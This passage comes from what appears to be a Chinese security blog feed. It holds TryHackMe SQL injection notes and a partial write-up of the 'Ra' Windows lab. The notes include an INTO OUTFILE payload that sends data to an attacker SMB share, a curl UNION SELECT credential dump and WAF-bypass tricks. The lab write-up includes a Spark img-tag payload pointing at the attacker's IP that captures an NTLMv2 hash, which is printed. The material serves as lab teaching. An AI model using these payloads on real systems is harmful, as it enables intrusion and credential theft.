来访问网络共享的内容。这将允许您连接到网络共享，然后您可以发出命令来列出所有命令。<code>smbclient //ATTACKBOX_IP/logs -U guest -N``ls</code></li></ul><p>我们有相同的 Web 应用程序，该应用程序具有搜索功能，可以查询访问图书馆的访客。此功能的服务器端代码容易受到 SQL 注入的攻击，您可以在 访问它。<code>http://10.10.164.79/oob/search_visitor.php?visitor_name=Tim</code></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165822.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165822.png" alt="image.png"></a><br>服务器代码如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$visitor_name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;visitor_name&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM visitor WHERE name = &#x27;<span class="subst">$visitor_name</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Generated SQL Query: <span class="subst">$sql</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Execute multi-query</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// Store first result set</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">store_result</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br></pre></td></tr></table></figure><p><strong>重要注意事项</strong></p><p>请务必注意，可以设置 MySQL 系统变量。设置后，此变量包含目录路径名，并且 MySQL 将仅允许将文件写入此指定目录。此安全措施有助于降低未经授权的文件操作的风险。<code>secure_file_priv</code></p><ul><li><strong>设置 secure_file_priv 时</strong>：MySQL 会将 <strong>INTO OUTFILE</strong> 等文件操作限制到指定目录。这意味着攻击者只能将文件写入此目录，从而限制了他们将数据泄露到任意位置的能力。</li><li><strong>当 secure_file_priv 为空时</strong>：如果变量为空，则 MySQL 不会施加任何目录限制，允许将文件写入 MySQL 服务器进程可访问的任何目录。此配置会带来更高的风险，因为它为攻击者提供了更大的灵活性。<code>secure_file_priv</code></li></ul><p>攻击者通常没有直接访问权限来检查 secure_file_priv 变量的值。因此，他们必须依靠 hit-and-trial 方法来确定是否可以写入文件以及在何处写入文件，测试各种路径以查看文件操作是否成功。  </p><p><strong>准备 Payload</strong></p><p>为了利用此漏洞，攻击者制作了一个有效负载以注入到参数中。有效负载将设计为执行额外的 SQL 查询，该查询将数据库版本信息写入外部 SMB 共享。<code>visitor_name</code>  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; SELECT @@version INTO OUTFILE &#x27;</span>\\\\ATTACKBOX_IP\\logs\\out.txt<span class="string">&#x27;; --</span></span><br></pre></td></tr></table></figure><p>我们来剖析一下上面的有效负载：</p><ul><li><code>1&#39;</code>：关闭 SQL 查询中的原始字符串。</li><li><code>;</code>：结束第一个 SQL 语句。</li><li><code>SELECT @@version INTO OUTFILE &#39;\\\\ATTACKBOX_IP\\logs\\out.txt&#39;;</code>：执行一个新的 SQL 语句，该语句检索数据库版本并将其写入位于 \ATTACKBOX_IP\logs\out.txt 的 SMB 共享。</li><li><code>--</code>：注释原始 SQL 查询的其余部分以防止语法错误。</li></ul><p>为了利用有效负载，攻击者将访问在外部 SMB 共享中创建文件的 URL。</p><p>要访问该文件，请使用 查看目录中收到的文件，如下所示：<code>ls /tmp``/tmp</code>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thm@machine$ls /tmp</span><br><span class="line">out.txt</span><br></pre></td></tr></table></figure><h1 id="高级-SQL-注入"><a href="#高级-SQL-注入" class="headerlink" title="高级 SQL 注入"></a>高级 SQL 注入</h1><p>高级 SQL 注入涉及一系列超越基本攻击的复杂方法。以下是渗透测试人员应注意的一些重要高级技术：</p><p>HTTP 协议标头注入</p><p>HTTP 标头可以携带用户输入，这些输入可能用于服务器端的 SQL 查询。如果这些输入没有被清理，可能会导致 SQL 注入。该技术涉及操作 HTTP 标头（如 <strong>User-Agent</strong>、<strong>Referer</strong> 或 <strong>X-Forwarded-For</strong>）以注入 SQL 命令。服务器可能会记录这些标头或在 SQL 查询中使用它们。例如，恶意 User-Agent 报头将类似于 . 如果服务器在 SQL 查询中包含 User-Agent 标头而未对其进行清理，则可能会导致 SQL 注入。<code>User-Agent: &#39; OR 1=1; --</code></p><p>在此示例中，Web 应用程序将 HTTP 请求的 User-Agent 标头记录到数据库中名为 logs 的表中。应用程序提供了一个终端节点，用于显示 logs 表中的所有记录条目。当用户访问网页时，他们的浏览器会发送一个 User-Agent 标头，用于标识浏览器和操作系统。此标头通常用于日志记录目的或为特定浏览器定制内容。在我们的应用程序中，此 User-Agent 标头入到日志表中，然后可以通过提供的端点进行查看。<code>http://10.10.164.79/httpagent/</code></p><p>给定终端节点，攻击者可能会尝试将 SQL 代码注入 User-Agent 标头，以利用 SQL 注入漏洞。例如，通过将 User-Agent 标头设置为恶意值（如 ），攻击者会尝试注入 SQL 代码，将 logs 表的结果与 user 表中的敏感数据组合在一起。<code>User-Agent: &#39; UNION SELECT username, password FROM user; --</code></p><p>以下是插入日志的服务器端代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userAgent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$insert_sql</span> = <span class="string">&quot;INSERT INTO logs (user_Agent) VALUES (&#x27;<span class="subst">$userAgent</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$insert_sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-green-500&#x27;&gt;New logs inserted successfully&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-red-500&#x27;&gt;Error: &quot;</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">&quot; (Error Code: &quot;</span> . <span class="variable">$conn</span>-&gt;errno . <span class="string">&quot;)&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM logs WHERE user_Agent = &#x27;<span class="subst">$userAgent</span>&#x27;&quot;</span>;</span><br><span class="line">..</span><br><span class="line">... </span><br></pre></td></tr></table></figure><p>User-Agent 值使用 INSERT SQL 语句插入到日志表中。如果插入成功，则会显示一条成功消息。如果在插入过程中出现错误，则会显示包含详细信息的错误消息。<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165929.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165929.png" alt="image.png"></a></p><p><strong>准备 Payload</strong></p><p>我们将准备 SQL 有效负载并将其注入 User-Agent 标头，以演示如何通过 HTTP 标头利用 SQL 注入。我们的目标有效负载将是 ‘ UNION SELECT 用户名，密码 FROM 用户;#. 此有效负载旨在：</p><ul><li><strong>关闭现有字符串文字</strong>：初始单引号 （） 用于关闭 SQL 查询中的现有字符串文字。<code>&#39;</code></li><li><strong>注入 UNION SELECT 语句</strong>：有效负载的一部分用于从 user 表中检索 username 和 password 列。<code>UNION SELECT username, password FROM user;</code></li><li><strong>Comment out the Rest of the Query</strong>：该字符用于注释掉 SQL 查询的其余部分，确保忽略任何后续 SQL 代码。<code>#</code></li></ul><p>我们需要将此有效负载作为 HTTP 请求中 User-Agent 标头的一部分发送，以注入此有效负载，这可以使用 <strong>Burp Suite</strong> 或 <strong>cURL</strong> 等工具完成。我们将使用 curl 命令行工具发送带有自定义 User-Agent 标头的 HTTP 请求。打开终端并访问您的命令行界面。 使用以下命令发送带有自定义标头的请求 ：<code>User-Agent</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@tryhackme$ curl -H <span class="string">&quot;User-Agent: &#x27; UNION SELECT username, password FROM user; # &quot;</span> http://10.10.164.79/httpagent/ &lt;!DOCTYPE html&gt; &lt;html lang=<span class="string">&quot;en&quot;</span>&gt; &lt;<span class="built_in">head</span>&gt; &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt; &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt; &lt;title&gt;SQL Injection &lt;/title&gt; rel=<span class="string">&quot;stylesheet&quot;</span>&gt; &lt;/head&gt; &lt;body class=<span class="string">&quot;bg-gray-100&quot;</span>&gt; &lt;div class=<span class="string">&quot;container mx-auto p-8&quot;</span>&gt; &lt;h1 class=<span class="string">&quot;text-4xl font-bold mb-8 text-center&quot;</span>&gt;HTTP Logs&lt;/h1&gt; &lt;div class=<span class="string">&quot;bg-white p-6 rounded-lg shadow-lg&quot;</span>&gt; &lt;p class=<span class="string">&#x27;text-gray-600 text-sm mb-4&#x27;</span>&gt;Generated SQL Query: &lt;span class=<span class="string">&#x27;text-red-500&#x27;</span>&gt;SELECT * FROM logs WHERE user_Agent = <span class="string">&#x27;&#x27;</span> UNION SELECT username, password FROM user; <span class="comment">#&#x27;&lt;/span&gt;&lt;/p&gt;&lt;div class=&#x27;p-4 bg-gray-100 rounded shadow mb-4&#x27;&gt;&lt;p class=&#x27;font-bold&#x27;&gt;id: &lt;span class=&#x27;text-gray-700&#x27;&gt;bob&lt;/span&gt;&lt;/p&gt;&lt;p class=&#x27;font-bold&#x27;&gt;user_Agent: &lt;span class=&#x27;text-gray-700&#x27;&gt;bob@123&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;div class=&#x27;p-4 bg-gray-100 rounded shadow mb-4&#x27;&gt;&lt;p class=&#x27;font-bold&#x27;&gt;id: &lt;span class=&#x27;text-gray-700&#x27;&gt;attacker&lt;/span&gt;&lt;/p&gt;&lt;p class=&#x27;font-bold&#x27;&gt;user_Agent: &lt;span class=&#x27;text-gray-700&#x27;&gt;tesla&lt;/span&gt;&lt;/p&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>服务器的响应将显示在终端中。如果 SQL 注入成功，您将在响应中看到提取的数据（用户名和密码）。</p><p>利用存储过程</p><p>存储过程是存储在数据库中的例程，可以执行各种操作，例如插入、更新或查询数据。虽然存储过程可以帮助提高性能并确保一致性，但如果处理不当，它们也可能容易受到 SQL 注入的影响。</p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207170002.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207170002.png" alt="image.png"></a></p><p>存储过程是预编译的 SQL 语句，可以作为单个单元执行。它们存储在数据库中，应用程序可以调用它们来执行特定任务。存储过程可以接受参数，这使它们变得灵活而强大。但是，如果这些参数没有得到适当的清理，它们可能会引入 SQL 注入漏洞。</p><p>考虑一个旨在根据用户名检索用户数据的存储过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE sp_getUserData</span><br><span class="line">    @username <span class="title function_ invoke__">NVARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">AS</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE @sql <span class="title function_ invoke__">NVARCHAR</span>(<span class="number">4000</span>)</span><br><span class="line">    SET @sql = <span class="string">&#x27;SELECT * FROM users WHERE username = &#x27;</span><span class="string">&#x27;&#x27;</span> + @username + <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="title function_ invoke__">EXEC</span>(@sql)</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>在此示例中，存储过程将 @username 参数连接到动态 SQL 查询中。这种方法容易受到 SQL 注入的攻击，因为输入没有经过清理。</p><p>XML 和 JSON 注入  </p><p>解析 XML 或 JSON 数据并在 SQL 查询中使用解析数据的应用程序如果未正确清理输入，则可能容易受到注入。XML 和 JSON 注入涉及将恶意数据注入 XML 或 JSON 结构，然后在 SQL 查询中使用这些数据。如果应用程序直接在 SQL 语句中使用解析的值，则可能会发生这种情况。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1--&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;password&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果应用程序直接在 SQL 查询中使用这些值（如 ），则可能会导致注入。<code>SELECT * FROM users WHERE username = &#39;admin&#39; OR &#39;1&#39;=&#39;1&#39;-- AND password = &#39;password&#39;</code></p><p>QL由于安全措施的实施不当和不同 Web 框架的复杂性，注入仍然是一个常见的威胁_。_自动识别和利用这些漏洞可能具有挑战性，但已经开发了多种工具和技术来帮助简化这一过程。!</p><p>识别过程中的主要问题</p><p>识别 SQL 注入漏洞涉及多项挑战，类似于识别任何其他服务器端漏洞。以下是关键问题：</p><ul><li><strong>SQL 查询的动态性质</strong>：SQL 查询可以动态构建，因此难以检测注入点。具有多层逻辑的复杂查询可能会掩盖潜在的漏洞。</li><li><strong>各种注入点</strong>：SQL 注入可能发生在应用程序的不同部分，包括输入字段、HTTP 标头和 URL 参数。识别所有可能的注入点需要彻底的测试和对应用的全面了解。</li><li><strong>使用安全措施</strong>：应用程序可以使用准备好的语句、参数化查询和 ORM 框架，这可以防止 SQL 注入。自动化工具必须能够区分安全和不安全的查询构造。</li><li><strong>上下文特定检测</strong>：在 SQL 查询中使用用户输入的上下文可能差异很大。工具必须适应不同的环境，以准确识别漏洞。</li></ul><p>几个重要的工具</p><p>安全社区内已经开发了几个著名的工具和项目，以帮助自动查找 SQL 注入漏洞。以下是一些众所周知的工具和 GitHub 存储库，它们提供了检测和利用 SQL 注入的功能：</p><ul><li>**<a href="https://github.com/sqlmapproject/sqlmap">SQLMap</a>**：SQLMap 是一种开源工具，可自动执行检测和利用 Web 应用程序中的 SQL 注入漏洞的过程。它支持广泛的数据库，并为识别和利用提供了广泛的选项。您可以<a href="https://tryhackme.com/r/room/sqlmap">在此处</a>了解有关该工具的更多信息。</li><li>**<a href="https://github.com/xxgrunge/sqlninja">SQLNinja</a>**：SQLNinja 是一种专门用于利用使用 Microsoft SQL Server 作为后端数据库的 Web 应用程序中的 SQL 注入漏洞的工具。它自动执行各个阶段的漏洞利用，包括数据库指纹识别和数据提取。</li><li><a href="https://github.com/ron190/jsql-injection"><strong>JSQL 注入</strong></a>：一个 Java 库，专注于检测 Java 应用程序中的 SQL 注入漏洞。它支持各种类型的 SQL 注入攻击，并提供一系列用于提取数据和控制数据库的选项。</li><li><strong><a href="https://github.com/CiscoCXSecurity/bbqsql">烧烤SQL：</a></strong> BBQSQL 是一个 Blind SQL Injection 漏洞利用框架，旨在简单且高效地自动利用 Blind SQL Injection 漏洞。</li></ul><p>自动识别和利用 SQL 注入漏洞对于维护 Web 应用程序安全至关重要。SQLMap、SQLNinja 和 BBQSQL 等工具为检测和利用这些漏洞提供了强大的功能。但是，重要的是要了解自动化工具的局限性以及手动分析和验证的必要性，以确保全面的安全覆盖。通过将这些工具集成到您的安全工作流程中并遵循输入验证和查询构建的最佳实践，您可以有效降低与 SQL 注入漏洞相关的风险。</p><h1 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h1><p>SQL 注入是一个众所周知且普遍存在的漏洞，多年来一直是 Web 应用程序安全的主要关注点。渗透测试人员在评估期间必须特别注意此漏洞，因为它需要全面了解识别和利用 SQL 注入点的各种技术。同样，安全编码人员必须通过实施强大的输入验证并遵守安全编码实践来防止此类攻击，从而优先考虑保护其应用程序。下面提到了一些最佳实践：</p><p>安全编码员</p><ul><li><strong>参数化查询和预编译语句</strong>：使用参数化查询和预编译语句来确保所有用户输入都被视为数据而不是可执行代码。此技术通过将查询结构与数据分离来帮助防止 SQL 注入。例如，在带有 PDO 的 PHP 中，您可以准备一个语句并绑定参数，这可确保用户输入得到安全处理，就像 .<code>$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM users WHERE username = :username&quot;); $stmt-&gt;execute([&#39;username&#39; =&gt; $username]);</code></li><li><strong>输入验证和清理</strong>：实施强大的输入验证和清理，以确保输入符合预期格式。验证数据类型、长度和范围，并拒绝任何不符合这些条件的输入。使用 PHP 中的内置函数（如 和）来有效地清理输入。<code>htmlspecialchars()``filter_var()</code></li><li><strong>最低权限原则</strong>：通过向应用程序帐户授予最低必要的数据库权限来应用最低权限原则。避免使用具有管理权限的数据库帐户进行日常操作。这通过限制攻击者对关键数据库功能的访问，将成功的 SQL 注入攻击的潜在影响降至最低。</li><li><strong>存储过程</strong>：使用存储过程封装和验证 SQL 逻辑。这允许您控制和验证数据库本身内的输入，从而降低 SQL 注入的风险。确保存储过程仅接受经过验证的输入，并且设计为在内部处理输入清理。</li><li><strong>定期安全审计和代码审查</strong>：定期进行安全审计和代码审查，以识别和解决漏洞。自动化工具可以帮助扫描 SQL 注入风险，但人工审查对于发现细微问题也是必不可少的。定期审核可确保您的安全实践与不断变化的威胁保持同步。</li></ul><p>渗透测试器</p><ul><li><strong>利用特定于数据库的功能</strong>：不同的数据库管理系统 （DBMS） 具有独特的功能和语法。渗透测试人员应该了解目标 DBMS（例如 MySQL、PostgreSQL、Oracle、MSSQL）的细节，以有效地利用这些功能。例如，MSSQL 支持该命令，该命令可用于执行系统命令。<code>xp_cmdshell</code></li><li><strong>利用错误消息</strong>：利用详细的错误消息来深入了解数据库架构和结构。基于错误的 SQL 注入涉及触发应用程序生成错误消息，以揭示有用的信息。例如，使用 1’ AND 1&#x3D;CONVERT（int， （SELECT @@version）） – 可能会生成泄漏版本信息的错误。</li><li><strong>绕过 WAF 和过滤器</strong>：测试各种混淆技术以绕过 Web 应用程序防火墙 （WAF） 和输入过滤器。这包括使用混合大小写 （SeLeCt）、串联 （CONCAT（CHAR（83）、CHAR（69）、CHAR（76）、CHAR（69）、CHAR（67）、CHAR（84））） 和替代编码（十六进制、URL 编码）。此外，使用内联注释 （&#x2F;**&#x2F;） 和不同的字符编码 （例如 %09、%0A） 可以帮助绕过简单的过滤器。</li><li><strong>数据库指纹识别</strong>：确定数据库的类型和版本以定制攻击。这可以通过发送特定查询来完成，这些查询根据 DBMS 产生不同的结果。例如，SELECT version（） 适用于 PostgreSQL，而 SELECT @@version适用于 MySQL 和 MSSQL。</li><li><strong>使用 SQL 注入进行透视</strong>：使用 SQL 注入来透视和利用网络的其他部分。一旦数据库服务器遭到入侵，它就可以用于访问其他内部系统。这可能涉及提取凭证或利用系统之间的信任关系。</li></ul><p>高级 SQL 注入测试需要对各种技术有深入的了解，并能够适应不同的环境。渗透测试人员应采用各种方法，从利用特定于数据库的功能到绕过复杂的过滤器，再到彻底评估和利用 SQL 注入漏洞。有条不紊地记录每个步骤可确保对应用程序的安全性进行全面评估。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thm-ra-windows域主机的入侵流程</title>
      <link href="/2024/12/04/ra/"/>
      <url>/2024/12/04/ra/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>您已经可以访问 WindCorp 的内部网络，这家价值数十亿美元的公司正在运行广泛的社交媒体活动，声称无法破解（哈！这个说法就这么多了！</p></blockquote><p>下一步是拿起他们的皇冠上的明珠，获得对他们内部网络的完全访问权限。您已经发现了一台新的 Windows 机器，它可能会引导您实现最终目标。你能征服这个最终 Boss 并拥有他们的内部网络吗？</p><p>祝您黑客活动愉快！</p><h2 id="靶场概述"><a href="#靶场概述" class="headerlink" title="靶场概述"></a>靶场概述</h2><p>难度：<br>描述：hard</p><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.237.226</td></tr><tr><td>OS</td><td>kali</td><td>windwos</td></tr></tbody></table><hr><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234043.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234043.png" alt="image.png"></a></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234158.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234158.png" alt="image.png"></a></p><p>提取出mail<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234719.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234719.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">organicfish718@fire.windcorp.thm  </span><br><span class="line">organicwolf509@fire.windcorp.thm  </span><br><span class="line">tinywolf424@fire.windcorp.thm  </span><br><span class="line">angrybird253@fire.windcorp.thm  </span><br><span class="line">buse@fire.windcorp.thm  </span><br><span class="line">Edeltraut@fire.windcorp.thm  </span><br><span class="line">Edward@fire.windcorp.thm  </span><br><span class="line">Emile@fire.windcorp.thm  </span><br><span class="line">tinygoose102@fire.windcorp.thm  </span><br><span class="line">brownostrich284@fire.windcorp.thm  </span><br><span class="line">sadswan869@fire.windcorp.thm  </span><br><span class="line">goldencat416@fire.windcorp.thm  </span><br><span class="line">whiteleopard529@fire.windcorp.thm  </span><br><span class="line">happymeercat399@fire.windcorp.thm  </span><br><span class="line">orangegorilla428@fire.windcorp.thm  </span><br></pre></td></tr></table></figure><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234958.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234958.png" alt="image.png"></a></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234948.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204234948.png" alt="image.png"></a></p><p>或许可以解决重置密码的密保<br>Lily Levesque<br>AndSparky<br>lilyleAndSparky.jpg<br>通过一些信息获取到了lilyle 的密码<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204235510.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204235510.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lilyle</span><br><span class="line">ChangeMe#1234</span><br></pre></td></tr></table></figure><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204235643.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204235643.png" alt="image.png"></a></p><p>尝试用lilyle的凭证登录<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204235818.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241204235818.png" alt="image.png"></a></p><p>有个注意点 观察到443端口也是开放的<br>使用https访问主域名</p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205001406.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205001406.png" alt="image.png"></a></p><p>此路暂时不通缺少凭证</p><h2 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h2><p>smb  445 利用<br>发现share目录获取内容<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205002047.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205002047.png" alt="image.png"></a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Spark 2.8.3 的安装文件也很多，根据快速的谷歌搜索，我们发现 Spark 2.8.3 是易受攻击的。我将从 smb 共享中获取 .deb 文件。<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205002748.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205002748.png" alt="image.png"></a></p><p>在阅读 时，我发现了这个 <a href="https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md">github 存储库</a>，它实际上是由这台机器的制造商创建的。据此，我们可以使用 spark 向其他用户发送带有 img 标签的消息，每次用户点击链接，或者 ROAR 模块自动预加载时，外部服务器都会收到访问链接的用户（即您正在聊天的用户）对图像的请求，以及 NTLM 哈希值！<br>如 github 存储库中所述，我们将使用并发送带有 img 标签的消息，并且我们应该会收到访问该链接的用户的 NTLM 哈希值。<code>CVE-2020-12772``responder</code></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205002858.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205002858.png" alt="image.png"></a></p><p>我们有一个用户名列表，我们可以将我们的有效负载 发送给不同的用户，如果我们获得其中任何一个的 NTLM 哈希值，请在响应者中签入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“&lt;img src=http：//yourtun0IP/a.png&gt;”</span><br></pre></td></tr></table></figure><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205003024.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241205003024.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+] Listening for events...</span><br><span class="line">[HTTP] NTLMv2 Client   : 10.10.226.131</span><br><span class="line">[HTTP] NTLMv2 Username : WINDCORP\buse</span><br><span class="line">[HTTP] NTLMv2 Hash     : buse::WINDCORP:581eb034fb28c39c:54A0D21F2C7F9C9FC662887D404ADBE6:010100000000</span><br><span class="line">00003016F4F0AEBAD6019F1E18DD6C6FF8DD000000000200060053004D0042000100160053004D0042002D0054004F004F004C</span><br><span class="line">004B00490054000400120073006D0062002E006C006F00630061006C0003002800730065007200760065007200320030003000</span><br><span class="line">33002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000</span><br><span class="line">00000000000100000000200000D06AF3C0BE5C4909A34ED0E1314D4F4E9E879FB75EC17102D80D7E32C45E88740A0010000000</span><br><span class="line">0000000000000000000000000000090000000000000000000000</span><br><span class="line">[*] Skipping previously captured hash for WINDCORP\buse</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 